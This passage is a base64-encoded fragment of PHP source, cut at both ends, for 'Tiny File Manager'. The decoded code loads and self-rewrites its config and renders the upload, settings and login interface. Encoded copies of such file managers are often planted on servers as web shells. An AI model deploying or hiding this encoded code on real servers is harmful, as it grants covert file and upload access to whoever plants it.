icsCiAgICAgICAgICAgICdlcnJvcl9yZXBvcnRpbmcnID0+IHRydWUsCiAgICAgICAgICAgICdzaG93X2hpZGRlbicgPT4gdHJ1ZQogICAgICAgICk7CiAgICAgICAgJGRhdGEgPSBmYWxzZTsKICAgICAgICBpZiAoc3RybGVuKCRDT05GSUcpKSB7CiAgICAgICAgICAgICRkYXRhID0gZm1fb2JqZWN0X3RvX2FycmF5KGpzb25fZGVjb2RlKCRDT05GSUcpKTsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAkbXNnID0gJ1RpbnkgRmlsZSBNYW5hZ2VyPGJyPkVycm9yOiBDYW5ub3QgbG9hZCBjb25maWd1cmF0aW9uJzsKICAgICAgICAgICAgaWYgKHN1YnN0cigkZm1fdXJsLCAtMSkgPT0gJy8nKSB7CiAgICAgICAgICAgICAgICAkZm1fdXJsID0gcnRyaW0oJGZtX3VybCwgJy8nKTsKICAgICAgICAgICAgICAgICRtc2cgLj0gJzxicj4nOwogICAgICAgICAgICAgICAgJG1zZyAuPSAnPGJyPlNlZW1zIGxpa2UgeW91IGhhdmUgYSB0cmFpbGluZyBzbGFzaCBvbiB0aGUgVVJMLic7CiAgICAgICAgICAgICAgICAkbXNnIC49ICc8YnI+VHJ5IHRoaXMgbGluazogPGEgaHJlZj0iJyAuICRmbV91cmwgLiAnIj4nIC4gJGZtX3VybCAuICc8L2E+JzsKICAgICAgICAgICAgfQogICAgICAgICAgICBkaWUoJG1zZyk7CiAgICAgICAgfQogICAgICAgIGlmIChpc19hcnJheSgkZGF0YSkgJiYgY291bnQoJGRhdGEpKSAkdGhpcy0+ZGF0YSA9ICRkYXRhOwogICAgICAgIGVsc2UgJHRoaXMtPnNhdmUoKTsKICAgIH0KCiAgICBmdW5jdGlvbiBzYXZlKCkKICAgIHsKICAgICAgICAkZm1fZmlsZSA9IF9fRklMRV9fOwogICAgICAgICR2YXJfbmFtZSA9ICckQ09ORklHJzsKICAgICAgICAkdmFyX3ZhbHVlID0gdmFyX2V4cG9ydChqc29uX2VuY29kZSgkdGhpcy0+ZGF0YSksIHRydWUpOwogICAgICAgICRjb25maWdfc3RyaW5nID0gIjw/cGhwIiAuIGNocigxMykgLiBjaHIoMTApIC4gIi8vRGVmYXVsdCBDb25maWd1cmF0aW9uIi5jaHIoMTMpIC4gY2hyKDEwKS4iJHZhcl9uYW1lID0gJHZhcl92YWx1ZTsiIC4gY2hyKDEzKSAuIGNocigxMCk7CiAgICAgICAgaWYgKGlzX3dyaXRhYmxlKCRmbV9maWxlKSkgewogICAgICAgICAgICAkbGluZXMgPSBmaWxlKCRmbV9maWxlKTsKICAgICAgICAgICAgaWYgKCRmaCA9IEBmb3BlbigkZm1fZmlsZSwgInciKSkgewogICAgICAgICAgICAgICAgQGZwdXRzKCRmaCwgJGNvbmZpZ19zdHJpbmcsIHN0cmxlbigkY29uZmlnX3N0cmluZykpOwogICAgICAgICAgICAgICAgZm9yICgkeCA9IDM7ICR4IDwgY291bnQoJGxpbmVzKTsgJHgrKykgewogICAgICAgICAgICAgICAgICAgIEBmcHV0cygkZmgsICRsaW5lc1skeF0sIHN0cmxlbigkbGluZXNbJHhdKSk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBAZmNsb3NlKCRmaCk7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9Cn0KCgoKLy8tLS0gdGVtcGxhdGVzIGZ1bmN0aW9ucwoKLyoqCiAqIFNob3cgbmF2IGJsb2NrCiAqIEBwYXJhbSBzdHJpbmcgJHBhdGgKICovCmZ1bmN0aW9uIGZtX3Nob3dfbmF2X3BhdGgoJHBhdGgpCnsKICAgIGdsb2JhbCAkbGFuZywgJHN0aWNreV9uYXZiYXI7CiAgICAkaXNTdGlja3lOYXZCYXIgPSAkc3RpY2t5X25hdmJhciA/ICdmaXhlZC10b3AnIDogJyc7CiAgICAkZ2V0VGhlbWUgPSBmbV9nZXRfdGhlbWUoKTsKICAgICRnZXRUaGVtZSAuPSAiIG5hdmJhci1saWdodCI7CiAgICBpZihGTV9USEVNRSA9PSAiZGFyayIpIHsKICAgICAgICAkZ2V0VGhlbWUgLj0gIiBuYXZiYXItZGFyayI7CiAgICB9IGVsc2UgewogICAgICAgICRnZXRUaGVtZSAuPSAiIGJnLXdoaXRlIjsKICAgIH0KICAgID8+CiAgICA8bmF2IGNsYXNzPSJuYXZiYXIgbmF2YmFyLWV4cGFuZC1sZyA8P3BocCBlY2hvICRnZXRUaGVtZTsgPz4gbWItNCBtYWluLW5hdiA8P3BocCBlY2hvICRpc1N0aWNreU5hdkJhciA/PiI+CiAgICAgICAgPGEgY2xhc3M9Im5hdmJhci1icmFuZCIgaHJlZj0iIj4gPD9waHAgZWNobyBsbmcoJ0FwcFRpdGxlJykgPz4gPC9hPgogICAgICAgIDxidXR0b24gY2xhc3M9Im5hdmJhci10b2dnbGVyIiB0eXBlPSJidXR0b24iIGRhdGEtdG9nZ2xlPSJjb2xsYXBzZSIgZGF0YS10YXJnZXQ9IiNuYXZiYXJTdXBwb3J0ZWRDb250ZW50IiBhcmlhLWNvbnRyb2xzPSJuYXZiYXJTdXBwb3J0ZWRDb250ZW50IiBhcmlhLWV4cGFuZGVkPSJmYWxzZSIgYXJpYS1sYWJlbD0iVG9nZ2xlIG5hdmlnYXRpb24iPgogICAgICAgICAgICA8c3BhbiBjbGFzcz0ibmF2YmFyLXRvZ2dsZXItaWNvbiI+PC9zcGFuPgogICAgICAgIDwvYnV0dG9uPgogICAgICAgIDxkaXYgY2xhc3M9ImNvbGxhcHNlIG5hdmJhci1jb2xsYXBzZSIgaWQ9Im5hdmJhclN1cHBvcnRlZENvbnRlbnQiPgoKICAgICAgICAgICAgPD9waHAKICAgICAgICAgICAgJHBhdGggPSBmbV9jbGVhbl9wYXRoKCRwYXRoKTsKICAgICAgICAgICAgJHJvb3RfdXJsID0gIjxhIGhyZWY9Jz9wPSc+PGkgY2xhc3M9J2ZhIGZhLWhvbWUnIGFyaWEtaGlkZGVuPSd0cnVlJyB0aXRsZT0nIiAuIEZNX1JPT1RfUEFUSCAuICInPjwvaT48L2E+IjsKICAgICAgICAgICAgJHNlcCA9ICc8aSBjbGFzcz0iYnJlYWQtY3J1bWIiPiAvIDwvaT4nOwogICAgICAgICAgICBpZiAoJHBhdGggIT0gJycpIHsKICAgICAgICAgICAgICAgICRleHBsb2RlZCA9IGV4cGxvZGUoJy8nLCAkcGF0aCk7CiAgICAgICAgICAgICAgICAkY291bnQgPSBjb3VudCgkZXhwbG9kZWQpOwogICAgICAgICAgICAgICAgJGFycmF5ID0gYXJyYXkoKTsKICAgICAgICAgICAgICAgICRwYXJlbnQgPSAnJzsKICAgICAgICAgICAgICAgIGZvciAoJGkgPSAwOyAkaSA8ICRjb3VudDsgJGkrKykgewogICAgICAgICAgICAgICAgICAgICRwYXJlbnQgPSB0cmltKCRwYXJlbnQgLiAnLycgLiAkZXhwbG9kZWRbJGldLCAnLycpOwogICAgICAgICAgICAgICAgICAgICRwYXJlbnRfZW5jID0gdXJsZW5jb2RlKCRwYXJlbnQpOwogICAgICAgICAgICAgICAgICAgICRhcnJheVtdID0gIjxhIGhyZWY9Jz9wPXskcGFyZW50X2VuY30nPiIgLiBmbV9lbmMoZm1fY29udmVydF93aW4oJGV4cGxvZGVkWyRpXSkpIC4gIjwvYT4iOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgJHJvb3RfdXJsIC49ICRzZXAgLiBpbXBsb2RlKCRzZXAsICRhcnJheSk7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWNobyAnPGRpdiBjbGFzcz0iY29sLXhzLTYgY29sLXNtLTUiPicgLiAkcm9vdF91cmwgLiAnPC9kaXY+JzsKICAgICAgICAgICAgPz4KCiAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNvbC14cy02IGNvbC1zbS03IHRleHQtcmlnaHQiPgogICAgICAgICAgICAgICAgPHVsIGNsYXNzPSJuYXZiYXItbmF2IG1yLWF1dG8gZmxvYXQtcmlnaHQgPD9waHAgZWNobyBmbV9nZXRfdGhlbWUoKTsgID8+Ij4KICAgICAgICAgICAgICAgICAgICA8bGkgY2xhc3M9Im5hdi1pdGVtIG1yLTIiPgogICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJpbnB1dC1ncm91cCBpbnB1dC1ncm91cC1zbSBtci0xIiBzdHlsZT0ibWFyZ2luLXRvcDo0cHg7Ij4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJ0ZXh0IiBjbGFzcz0iZm9ybS1jb250cm9sIiBwbGFjZWhvbGRlcj0iPD9waHAgZWNobyBsbmcoJ1NlYXJjaCcpID8+IiBhcmlhLWxhYmVsPSI8P3BocCBlY2hvIGxuZygnU2VhcmNoJykgPz4iIGFyaWEtZGVzY3JpYmVkYnk9InNlYXJjaC1hZGRvbjIiIGlkPSJzZWFyY2gtYWRkb24iPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iaW5wdXQtZ3JvdXAtYXBwZW5kIj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8c3BhbiBjbGFzcz0iaW5wdXQtZ3JvdXAtdGV4dCIgaWQ9InNlYXJjaC1hZGRvbjIiPjxpIGNsYXNzPSJmYSBmYS1zZWFyY2giPjwvaT48L3NwYW4+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImlucHV0LWdyb3VwLWFwcGVuZCBidG4tZ3JvdXAiPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxzcGFuIGNsYXNzPSJpbnB1dC1ncm91cC10ZXh0IGRyb3Bkb3duLXRvZ2dsZSIgaWQ9InNlYXJjaC1hZGRvbjIiIGRhdGEtdG9nZ2xlPSJkcm9wZG93biIgYXJpYS1oYXNwb3B1cD0idHJ1ZSIgYXJpYS1leHBhbmRlZD0iZmFsc2UiPjwvc3Bhbj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImRyb3Bkb3duLW1lbnUgZHJvcGRvd24tbWVudS1yaWdodCI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxhIGNsYXNzPSJkcm9wZG93bi1pdGVtIiBocmVmPSI8P3BocCBlY2hvICRwYXRoMiA9ICRwYXRoID8gJHBhdGggOiAnLic7ID8+IiBpZD0ianMtc2VhcmNoLW1vZGFsIiBkYXRhLXRvZ2dsZT0ibW9kYWwiIGRhdGEtdGFyZ2V0PSIjc2VhcmNoTW9kYWwiPkFkdmFuY2VkIFNlYXJjaDwvYT4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgIDwvbGk+CiAgICAgICAgICAgICAgICAgICAgPD9waHAgaWYgKCFGTV9SRUFET05MWSk6ID8+CiAgICAgICAgICAgICAgICAgICAgPGxpIGNsYXNzPSJuYXYtaXRlbSI+CiAgICAgICAgICAgICAgICAgICAgICAgIDxhIHRpdGxlPSI8P3BocCBlY2hvIGxuZygnVXBsb2FkJykgPz4iIGNsYXNzPSJuYXYtbGluayIgaHJlZj0iP3A9PD9waHAgZWNobyB1cmxlbmNvZGUoRk1fUEFUSCkgPz4mYW1wO3VwbG9hZCI+PGkgY2xhc3M9ImZhIGZhLWNsb3VkLXVwbG9hZCIgYXJpYS1oaWRkZW49InRydWUiPjwvaT4gPD9waHAgZWNobyBsbmcoJ1VwbG9hZCcpID8+PC9hPgogICAgICAgICAgICAgICAgICAgIDwvbGk+CiAgICAgICAgICAgICAgICAgICAgPGxpIGNsYXNzPSJuYXYtaXRlbSI+CiAgICAgICAgICAgICAgICAgICAgICAgIDxhIHRpdGxlPSI8P3BocCBlY2hvIGxuZygnTmV3SXRlbScpID8+IiBjbGFzcz0ibmF2LWxpbmsiIGhyZWY9IiNjcmVhdGVOZXdJdGVtIiBkYXRhLXRvZ2dsZT0ibW9kYWwiIGRhdGEtdGFyZ2V0PSIjY3JlYXRlTmV3SXRlbSI+PGkgY2xhc3M9ImZhIGZhLXBsdXMtc3F1YXJlIj48L2k+IDw/cGhwIGVjaG8gbG5nKCdOZXdJdGVtJykgPz48L2E+CiAgICAgICAgICAgICAgICAgICAgPC9saT4KICAgICAgICAgICAgICAgICAgICA8P3BocCBlbmRpZjsgPz4KICAgICAgICAgICAgICAgICAgICA8P3BocCBpZiAoRk1fVVNFX0FVVEgpOiA/PgogICAgICAgICAgICAgICAgICAgIDxsaSBjbGFzcz0ibmF2LWl0ZW0gYXZhdGFyIGRyb3Bkb3duIj4KICAgICAgICAgICAgICAgICAgICAgICAgPGEgY2xhc3M9Im5hdi1saW5rIGRyb3Bkb3duLXRvZ2dsZSIgaWQ9Im5hdmJhckRyb3Bkb3duTWVudUxpbmstNSIgZGF0YS10b2dnbGU9ImRyb3Bkb3duIiBhcmlhLWhhc3BvcHVwPSJ0cnVlIiBhcmlhLWV4cGFuZGVkPSJmYWxzZSI+IDxpIGNsYXNzPSJmYSBmYS11c2VyLWNpcmNsZSI+PC9pPiA8P3BocCBpZihpc3NldCgkX1NFU1NJT05bRk1fU0VTU0lPTl9JRF1bJ2xvZ2dlZCddKSkgeyBlY2hvICRfU0VTU0lPTltGTV9TRVNTSU9OX0lEXVsnbG9nZ2VkJ107IH0gPz48L2E+CiAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImRyb3Bkb3duLW1lbnUgZHJvcGRvd24tbWVudS1yaWdodCA8P3BocCBlY2hvIGZtX2dldF90aGVtZSgpOyA/PiIgYXJpYS1sYWJlbGxlZGJ5PSJuYXZiYXJEcm9wZG93bk1lbnVMaW5rLTUiPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPD9waHAgaWYgKCFGTV9SRUFET05MWSk6ID8+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8YSB0aXRsZT0iPD9waHAgZWNobyBsbmcoJ1NldHRpbmdzJykgPz4iIGNsYXNzPSJkcm9wZG93bi1pdGVtIG5hdi1saW5rIiBocmVmPSI/cD08P3BocCBlY2hvIHVybGVuY29kZShGTV9QQVRIKSA/PiZhbXA7c2V0dGluZ3M9MSI+PGkgY2xhc3M9ImZhIGZhLWNvZyIgYXJpYS1oaWRkZW49InRydWUiPjwvaT4gPD9waHAgZWNobyBsbmcoJ1NldHRpbmdzJykgPz48L2E+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8P3BocCBlbmRpZiA/PgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGEgdGl0bGU9Ijw/cGhwIGVjaG8gbG5nKCdIZWxwJykgPz4iIGNsYXNzPSJkcm9wZG93bi1pdGVtIG5hdi1saW5rIiBocmVmPSI/cD08P3BocCBlY2hvIHVybGVuY29kZShGTV9QQVRIKSA/PiZhbXA7aGVscD0yIj48aSBjbGFzcz0iZmEgZmEtZXhjbGFtYXRpb24tY2lyY2xlIiBhcmlhLWhpZGRlbj0idHJ1ZSI+PC9pPiA8P3BocCBlY2hvIGxuZygnSGVscCcpID8+PC9hPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGEgdGl0bGU9Ijw/cGhwIGVjaG8gbG5nKCdMb2dvdXQnKSA/PiIgY2xhc3M9ImRyb3Bkb3duLWl0ZW0gbmF2LWxpbmsiIGhyZWY9Ij9sb2dvdXQ9MSI+PGkgY2xhc3M9ImZhIGZhLXNpZ24tb3V0IiBhcmlhLWhpZGRlbj0idHJ1ZSI+PC9pPiA8P3BocCBlY2hvIGxuZygnTG9nb3V0JykgPz48L2E+CiAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgIDwvbGk+CiAgICAgICAgICAgICAgICAgICAgPD9waHAgZWxzZTogPz4KICAgICAgICAgICAgICAgICAgICAgICAgPD9waHAgaWYgKCFGTV9SRUFET05MWSk6ID8+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8bGkgY2xhc3M9Im5hdi1pdGVtIj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8YSB0aXRsZT0iPD9waHAgZWNobyBsbmcoJ1NldHRpbmdzJykgPz4iIGNsYXNzPSJkcm9wZG93bi1pdGVtIG5hdi1saW5rIiBocmVmPSI/cD08P3BocCBlY2hvIHVybGVuY29kZShGTV9QQVRIKSA/PiZhbXA7c2V0dGluZ3M9MSI+PGkgY2xhc3M9ImZhIGZhLWNvZyIgYXJpYS1oaWRkZW49InRydWUiPjwvaT4gPD9waHAgZWNobyBsbmcoJ1NldHRpbmdzJykgPz48L2E+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2xpPgogICAgICAgICAgICAgICAgICAgICAgICA8P3BocCBlbmRpZjsgPz4KICAgICAgICAgICAgICAgICAgICA8P3BocCBlbmRpZjsgPz4KICAgICAgICAgICAgICAgIDwvdWw+CiAgICAgICAgICAgIDwvZGl2PgogICAgICAgIDwvZGl2PgogICAgPC9uYXY+CiAgICA8P3BocAp9CgovKioKICogU2hvdyBtZXNzYWdlIGZyb20gc2Vzc2lvbgogKi8KZnVuY3Rpb24gZm1fc2hvd19tZXNzYWdlKCkKewogICAgaWYgKGlzc2V0KCRfU0VTU0lPTltGTV9TRVNTSU9OX0lEXVsnbWVzc2FnZSddKSkgewogICAgICAgICRjbGFzcyA9IGlzc2V0KCRfU0VTU0lPTltGTV9TRVNTSU9OX0lEXVsnc3RhdHVzJ10pID8gJF9TRVNTSU9OW0ZNX1NFU1NJT05fSURdWydzdGF0dXMnXSA6ICdvayc7CiAgICAgICAgZWNobyAnPHAgY2xhc3M9Im1lc3NhZ2UgJyAuICRjbGFzcyAuICciPicgLiAkX1NFU1NJT05bRk1fU0VTU0lPTl9JRF1bJ21lc3NhZ2UnXSAuICc8L3A+JzsKICAgICAgICB1bnNldCgkX1NFU1NJT05bRk1fU0VTU0lPTl9JRF1bJ21lc3NhZ2UnXSk7CiAgICAgICAgdW5zZXQoJF9TRVNTSU9OW0ZNX1NFU1NJT05fSURdWydzdGF0dXMnXSk7CiAgICB9Cn0KCi8qKgogKiBTaG93IHBhZ2UgaGVhZGVyIGluIExvZ2luIEZvcm0KICovCmZ1bmN0aW9uIGZtX3Nob3dfaGVhZGVyX2xvZ2luKCkKewokc3ByaXRlc192ZXIgPSAnMjAxNjAzMTUnOwpoZWFkZXIoIkNvbnRlbnQtVHlwZTogdGV4dC9odG1sOyBjaGFyc2V0PXV0Zi04Iik7CmhlYWRlcigiRXhwaXJlczogU2F0LCAyNiBKdWwgMTk5NyAwNTowMDowMCBHTVQiKTsKaGVhZGVyKCJDYWNoZS1Db250cm9sOiBuby1zdG9yZSwgbm8tY2FjaGUsIG11c3QtcmV2YWxpZGF0ZSwgcG9zdC1jaGVjaz0wLCBwcmUtY2hlY2s9MCIpOwpoZWFkZXIoIlByYWdtYTogbm8tY2FjaGUiKTsKCmdsb2JhbCAkbGFuZywgJHJvb3RfdXJsLCAkZmF2aWNvbl9wYXRoOwo/Pgo8IURPQ1RZUEUgaHRtbD4KPGh0bWwgbGFuZz0iZW4iPgo8aGVhZD4KICAgIDxtZXRhIGNoYXJzZXQ9InV0Zi04Ij4KICAgIDxtZXRhIG5hbWU9InZpZXdwb3J0IiBjb250ZW50PSJ3aWR0aD1kZXZpY2Utd2lkdGgsIGluaXRpYWwtc2NhbGU9MSwgc2hyaW5rLXRvLWZpdD1ubyI+CiAgICA8bWV0YSBuYW1lPSJkZXNjcmlwdGlvbiIgY29udGVudD0iV2ViIGJhc2VkIEZpbGUgTWFuYWdlciBpbiBQSFAsIE1hbmFnZSB5b3VyIGZpbGVzIGVmZmljaWVudGx5IGFuZCBlYXNpbHkgd2l0aCBUaW55IEZpbGUgTWFuYWdlciI+CiAgICA8bWV0YSBuYW1lPSJhdXRob3IiIGNvbnRlbnQ9IkNDUCBQcm9ncmFtbWVycyI+CiAgICA8bWV0YSBuYW1lPSJyb2JvdHMiIGNvbnRlbnQ9Im5vaW5kZXgsIG5vZm9sbG93Ij4KICAgIDxtZXRhIG5hbWU9Imdvb2dsZWJvdCIgY29udGVudD0ibm9pbmRleCI+CiAgICA8bGluayByZWw9Imljb24iIGhyZWY9Ijw/cGhwIGVjaG8gZm1fZW5jKCRmYXZpY29uX3BhdGgpID8+IiB0eXBlPSJpbWFnZS9wbmciPgogICAgPHRpdGxlPjw/cGhwIGVjaG8gZm1fZW5jKEFQUF9USVRMRSkgPz48L3RpdGxlPgogICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJodHRwczovL3N0YWNrcGF0aC5ib290c3RyYXBjZG4uY29tL2Jvb3RzdHJhcC80LjUuMC9jc3MvYm9vdHN0cmFwLm1pbi5jc3MiPgogICAgPHN0eWxlPgogICAgICAgIGJvZHkuZm0tbG9naW4tcGFnZXsgYmFja2dyb3VuZC1jb2xvcjojZjdmOWZiO2ZvbnQtc2l6ZToxNHB4O2JhY2tncm91bmQtY29sb3I6I2Y3ZjlmYjtiYWNrZ3JvdW5kLWltYWdlOnVybCgiZGF0YTppbWFnZS9zdmcreG1sLCUzQ3N2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAzMDQgMzA0JyB3aWR0aD0nMzA0JyBoZWlnaHQ9JzMwNCclM0UlM0NwYXRoIGZpbGw9JyUyM2UyZTlmMScgZmlsbC1vcGFjaXR5PScwLjQnIGQ9J000NC4xIDIyNGE1IDUgMCAxIDEgMCAySDB2LTJoNDQuMXptMTYwIDQ4YTUgNSAwIDEgMSAwIDJIODJ2LTJoMTIyLjF6bTU3LjgtNDZhNSA1IDAgMSAxIDAtMkgzMDR2MmgtNDIuMXptMCAxNmE1IDUgMCAxIDEgMC0ySDMwNHYyaC00Mi4xem02LjItMTE0YTUgNSAwIDEgMSAwIDJoLTg2LjJhNSA1IDAgMSAxIDAtMmg4Ni4yem0tMjU2LTQ4YTUgNSAwIDEgMSAwIDJIMHYtMmgxMi4xem0xODUuOCAzNGE1IDUgMCAxIDEgMC0yaDg2LjJhNSA1IDAgMSAxIDAgMmgtODYuMnpNMjU4IDEyLjFhNSA1IDAgMSAxLTIgMFYwaDJ2MTIuMXptLTY0IDIwOGE1IDUgMCAxIDEtMiAwdi01NC4yYTUgNSAwIDEgMSAyIDB2NTQuMnptNDgtMTk4LjJWODBoNjJ2MmgtNjRWMjEuOWE1IDUgMCAxIDEgMiAwem0xNiAxNlY2NGg0NnYyaC00OFYzNy45YTUgNSAwIDEgMSAyIDB6bS0xMjggOTZWMjA4aDE2djEyLjFhNSA1IDAgMSAxLTIgMFYyMTBoLTE2di03Ni4xYTUgNSAwIDEgMSAyIDB6bS01LjktMjEuOWE1IDUgMCAxIDEgMCAySDExNHY0OEg4NS45YTUgNSAwIDEgMSAwLTJIMTEydi00OGgxMi4xem0tNi4yIDEzMGE1IDUgMCAxIDEgMC0ySDE3NnYtNzQuMWE1IDUgMCAxIDEgMiAwVjI0MmgtNjAuMXptLTE2LTY0YTUgNSAwIDEgMSAwLTJIMTE0djQ4aDEwLjFhNSA1IDAgMSAxIDAgMkgxMTJ2LTQ4aC0xMC4xek02NiAyODQuMWE1IDUgMCAxIDEtMiAwVjI3NEg1MHYzMGgtMnYtMzJoMTh2MTIuMXpNMjM2LjEgMTc2YTUgNSAwIDEgMSAwIDJIMjI2djk0aDQ4djMyaC0ydi0zMGgtNDh2LTk4aDEyLjF6bTI1LjgtMzBhNSA1IDAgMSAxIDAtMkgyNzR2NDQuMWE1IDUgMCAxIDEtMiAwVjE0NmgtMTAuMXptLTY0IDk2YTUgNSAwIDEgMSAwLTJIMjA4di04MGgxNnYtMTRoLTQyLjFhNSA1IDAgMSAxIDAtMkgyMjZ2MThoLTE2djgwaC0xMi4xem04Ni4yLTIxMGE1IDUgMCAxIDEgMCAySDI3MlYwaDJ2MzJoMTAuMXpNOTggMTAxLjlWMTQ2SDUzLjlhNSA1IDAgMSAxIDAtMkg5NnYtNDIuMWE1IDUgMCAxIDEgMiAwek01My45IDM0YTUgNSAwIDEgMSAwLTJIODBWMGgydjM0SDUzLjl6bTYwLjEgMy45VjY2SDgydjY0SDY5LjlhNSA1IDAgMSAxIDAtMkg4MFY2NGgzMlYzNy45YTUgNSAwIDEgMSAyIDB6TTEwMS45IDgyYTUgNSAwIDEgMSAwLTJIMTI4VjM3LjlhNSA1IDAgMSAxIDIgMFY4MmgtMjguMXptMTYtNjRhNSA1IDAgMSAxIDAtMkgxNDZ2NDQuMWE1IDUgMCAxIDEtMiAwVjE4aC0yNi4xem0xMDIuMiAyNzBhNSA1IDAgMSAxIDAgMkg5OHYxNGgtMnYtMTZoMTI0LjF6TTI0MiAxNDkuOVYxNjBoMTZ2MzRoLTE2djYyaDQ4djQ4aC0ydi00NmgtNDh2LTY2aDE2di0zMGgtMTZ2LTEyLjFhNSA1IDAgMSAxIDIgMHpNNTMuOSAxOGE1IDUgMCAxIDEgMC0ySDY0VjJINDhWMGgxOHYxOEg1My45em0xMTIgMzJhNSA1IDAgMSAxIDAtMkgxOTJWMGg1MHYyaC00OHY0OGgtMjguMXptLTQ4LTQ4YTUgNSAwIDAgMS05LjgtMmgyLjA3YTMgMyAwIDEgMCA1LjY2IDBIMTc4djM0aC0xOFYyMS45YTUgNSAwIDEgMSAyIDBWMzJoMTRWMmgtNTguMXptMCA5NmE1IDUgMCAxIDEgMC0ySDEzN2wzMi0zMmgzOVYyMS45YTUgNSAwIDEgMSAyIDBWNjZoLTQwLjE3bC0zMiAzMkgxMTcuOXptMjguMSA5MC4xYTUgNSAwIDEgMS0yIDB2LTc2LjUxTDE3NS41OSA4MEgyMjRWMjEuOWE1IDUgMCAxIDEgMiAwVjgyaC00OS41OUwxNDYgMTEyLjQxdjc1LjY5em0xNiAzMmE1IDUgMCAxIDEtMiAwdi05OS41MUwxODQuNTkgOTZIMzAwLjFhNSA1IDAgMCAxIDMuOS0zLjl2Mi4wN2EzIDMgMCAwIDAgMCA1LjY2djIuMDdhNSA1IDAgMCAxLTMuOS0zLjlIMTg1LjQxTDE2MiAxMjEuNDF2OTguNjl6bS0xNDQtNjRhNSA1IDAgMSAxLTIgMHYtMy41MWw0OC00OFY0OGgzMlYwaDJ2NTBINjZ2NTUuNDFsLTQ4IDQ4djIuNjl6TTUwIDUzLjl2NDMuNTFsLTQ4IDQ4VjIwOGgyNi4xYTUgNSAwIDEgMSAwIDJIMHYtNjUuNDFsNDgtNDhWNTMuOWE1IDUgMCAxIDEgMiAwem0tMTYgMTZWODkuNDFsLTM0IDM0di0yLjgybDMyLTMyVjY5LjlhNSA1IDAgMSAxIDIgMHpNMTIuMSAzMmE1IDUgMCAxIDEgMCAySDkuNDFMMCA0My40MVY0MC42TDguNTkgMzJoMy41MXptMjY1LjggMThhNSA1IDAgMSAxIDAtMmgxOC42OWw3LjQxLTcuNDF2Mi44MkwyOTcuNDEgNTBIMjc3Ljl6bS0xNiAxNjBhNSA1IDAgMSAxIDAtMkgyODh2LTcxLjQxbDE2LTE2djIuODJsLTE0IDE0VjIxMGgtMjguMXptLTIwOCAzMmE1IDUgMCAxIDEgMC0ySDY0di0yMi41OUw0MC41OSAxOTRIMjEuOWE1IDUgMCAxIDEgMC0ySDQxLjQxTDY2IDIxNi41OVYyNDJINTMuOXptMTUwLjIgMTRhNSA1IDAgMSAxIDAgMkg5NnYtNTYuNkw1Ni42IDE2MkgzNy45YTUgNSAwIDEgMSAwLTJoMTkuNUw5OCAyMDAuNlYyNTZoMTA2LjF6bS0xNTAuMiAyYTUgNSAwIDEgMSAwLTJIODB2LTQ2LjU5TDQ4LjU5IDE3OEgyMS45YTUgNSAwIDEgMSAwLTJINDkuNDFMODIgMjA4LjU5VjI1OEg1My45ek0zNCAzOS44djEuNjFMOS40MSA2Nkgwdi0yaDguNTlMMzIgNDAuNTlWMGgydjM5Ljh6TTIgMzAwLjFhNSA1IDAgMCAxIDMuOSAzLjlIMy44M0EzIDMgMCAwIDAgMCAzMDIuMTdWMjU2aDE4djQ4aC0ydi00NkgydjQyLjF6TTM0IDI0MXY2M2gtMnYtNjJIMHYtMmgzNHYxek0xNyAxOEgwdi0yaDE2VjBoMnYxOGgtMXptMjczLTJoMTR2MmgtMTZWMGgydjE2em0tMzIgMjczdjE1aC0ydi0xNGgtMTR2MTRoLTJ2LTE2aDE4djF6TTAgOTIuMUE1LjAyIDUuMDIgMCAwIDEgNiA5N2E1IDUgMCAwIDEtNiA0Ljl2LTIuMDdhMyAzIDAgMSAwIDAtNS42NlY5Mi4xek04MCAyNzJoMnYzMmgtMnYtMzJ6bTM3LjkgMzJoLTIuMDdhMyAzIDAgMCAwLTUuNjYgMGgtMi4wN2E1IDUgMCAwIDEgOS44IDB6TTUuOSAwQTUuMDIgNS4wMiAwIDAgMSAwIDUuOVYzLjgzQTMgMyAwIDAgMCAzLjgzIDBINS45em0yOTQuMiAwaDIuMDdBMyAzIDAgMCAwIDMwNCAzLjgzVjUuOWE1IDUgMCAwIDEtMy45LTUuOXptMy45IDMwMC4xdjIuMDdhMyAzIDAgMCAwLTEuODMgMS44M2gtMi4wN2E1IDUgMCAwIDEgMy45LTMuOXpNOTcgMTAwYTMgMyAwIDEgMCAwLTYgMyAzIDAgMCAwIDAgNnptMC0xNmEzIDMgMCAxIDAgMC02IDMgMyAwIDAgMCAwIDZ6bTE2IDE2YTMgMyA